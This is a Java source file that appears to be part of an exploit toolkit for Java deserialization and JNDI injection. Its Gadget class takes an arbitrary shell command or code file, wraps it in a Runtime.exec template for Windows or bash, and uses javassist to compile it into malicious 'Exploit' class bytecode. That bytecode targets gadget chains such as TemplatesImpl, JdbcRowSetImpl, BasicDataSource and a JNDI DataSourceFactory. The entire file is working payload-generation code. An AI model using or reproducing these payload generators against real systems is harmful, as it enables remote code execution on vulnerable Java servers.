public class Gadget {
	public static java.lang.String getInsertCode(java.lang.String command) {
		java.lang.String source = "";
		java.lang.String cmd = "";
		if (command.startsWith("code:")) {
			java.lang.String codefile = command.substring(5);
			try {
				java.io.File file = new java.io.File(codefile);
				if (file.exists()) {
					java.io.FileReader reader = new java.io.FileReader(file);
					java.io.BufferedReader br = new java.io.BufferedReader(reader);
					java.lang.StringBuffer sb = new java.lang.StringBuffer("");
					java.lang.String line = "";
					while ((line = br.readLine()) != null) {
						sb.append(line);
						sb.append("\r\n");
					} 
					cmd = sb.toString();
				} else {
					java.lang.System.err.println(java.lang.String.format("[-] %s is not exists!", new java.lang.Object[]{ codefile }));
					java.lang.System.exit(0);
				}
				source = cmd;
			} catch (java.io.IOException e) {
				e.printStackTrace();
			}
		} else if (command.startsWith("cmd:")) {
			cmd = command.substring(4).replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"");
			java.lang.String tpl = (((((((((("try {\n" + "            String cmd = \"") + cmd) + "\";\n") + "            String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\")\n") + "                    ? new String[]{\"cmd\", \"/c\", cmd}\n") + "                    : new String[]{\"/bin/bash\", \"-c\", cmd};\n") + "            java.lang.Process pc = Runtime.getRuntime().exec(cmds);\n") + "            pc.waitFor();\n") + "        }catch (Exception e){\n") + "            e.printStackTrace();\n") + "        }";
			source = tpl;
		}
		return source;
	}

	public static byte[] getJdbcRowSetImplExpCode(java.lang.String command) {
		try {
			java.lang.String code = gadget.Gadget.getInsertCode(command);
			javassist.ClassPool classPool = javassist.ClassPool.getDefault();
			final javassist.CtClass clazz = classPool.get(gadget.Default.class.getName());
			clazz.setName("Exploit");
			javassist.CtConstructor ctConstructor = clazz.getDeclaredConstructor(null);
			code = java.lang.String.format("{%s}", code);
			ctConstructor.setBody(code);
			final byte[] classBytes = clazz.toBytecode();
			return classBytes;
		} catch (java.lang.Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	public static byte[] getJndiDataSourceFactory1ExpCode(java.lang.String command) {
		try {
			java.lang.String code = gadget.Gadget.getInsertCode(command);
			javassist.ClassPool classPool = javassist.ClassPool.getDefault();
			final javassist.CtClass clazz = classPool.get(gadget.JndiDataSourceFactory1.class.getName());
			javassist.CtMethod ctMethod = clazz.getDeclaredMethod("getObjectInstance");
			code = java.lang.String.format("{%s\nreturn null;}", code);
			ctMethod.setBody(code);
			clazz.setName("Exploit");
			clazz.writeFile("/tmp");
			final byte[] classBytes = clazz.toBytecode();
			return classBytes;
		} catch (java.lang.Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	public static byte[] getTemplatesImpl1ExpCode(java.lang.String command) {
		try {
			java.lang.String code = gadget.Gadget.getInsertCode(command);
			javassist.ClassPool classPool = javassist.ClassPool.getDefault();
			final javassist.CtClass clazz = classPool.get(gadget.TemplatesImpl1.class.getName());
			javassist.CtConstructor ctConstructor = clazz.getDeclaredConstructor(null);
			ctConstructor.setBody("{}");
			code = java.lang.String.format("{%s}", code);
			ctConstructor.setBody(code);
			clazz.setName("Exploit");
			final byte[] classBytes = clazz.toBytecode();
			return classBytes;
		} catch (java.lang.Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	public static byte[] getTemplatesImpl2ExpCode(java.lang.String command) {
		try {
			java.lang.String code = gadget.Gadget.getInsertCode(command);
			javassist.ClassPool classPool = javassist.ClassPool.getDefault();
			final javassist.CtClass clazz = classPool.get(gadget.TemplatesImpl2.class.getName());
			javassist.CtConstructor ctConstructor = clazz.getDeclaredConstructor(null);
			ctConstructor.setBody("{}");
			code = java.lang.String.format("{%s}", code);
			ctConstructor.setBody(code);
			clazz.setName("Exploit");
			final byte[] classBytes = clazz.toBytecode();
			return classBytes;
		} catch (java.lang.Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	public static byte[] getBasicDataSource1ExpCode(java.lang.String command) {
		try {
			java.lang.String code = gadget.Gadget.getInsertCode(command);
			javassist.ClassPool classPool = javassist.ClassPool.getDefault();
			final javassist.CtClass clazz = classPool.get(gadget.Default.class.getName());
			javassist.CtConstructor ci = clazz.makeClassInitializer();
			ci.setBody(code);
			clazz.setName("Exploit");
			final byte[] classBytes = clazz.toBytecode();
			return classBytes;
		} catch (java.lang.Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	public static void main(java.lang.String[] args) {
		gadget.Gadget.getTemplatesImpl1ExpCode("cmd:ifconfig");
	}
}